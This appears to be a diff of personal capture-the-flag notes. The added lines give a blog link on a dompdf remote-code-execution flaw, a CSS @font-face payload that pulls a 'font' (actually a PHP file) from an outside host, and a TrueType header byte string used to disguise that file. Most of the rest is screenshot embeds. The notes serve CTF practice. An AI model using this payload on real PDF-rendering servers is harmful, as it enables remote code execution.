@@ -442,5 +442,39 @@ flag{http://home-2025-12-02-tdu3-b60612.wannatry.fr/3nwhe9e1bdq7lc7uqueo4kmcasiz
 
 ![[IMG-20251206140436308.png]]
 
-![[IMG-20251206151859333.png]]
+https://www.optiv.com/insights/discover/blog/exploiting-rce-vulnerability-dompdf
 
+
+![[IMG-20251206184037540.png]]
+
+```css
+@font-face {
+    font-family: 'exploit';
+    src: url('https://theoctf.pythonanywhere.com/static/test4.php');
+    font-weight: normal;
+    font-style: normal;
+}
+
+body {
+    font-family: 'exploit';
+}
+```
+
+Header TTF: \x00\x01\x00\x00\x00\x10\x00\x80
+
+![[IMG-20251206184439106.png]]
+
+
+![[IMG-20251206184116463.png]]
+
+![[IMG-20251206184137833.png]]
+
+![[IMG-20251206184254670.png]]
+
+![[IMG-20251206185412714.png]]
+
+![[IMG-20251206184311324.png]]
+
+![[IMG-20251206185246929.png]]
+
+## Chall 8
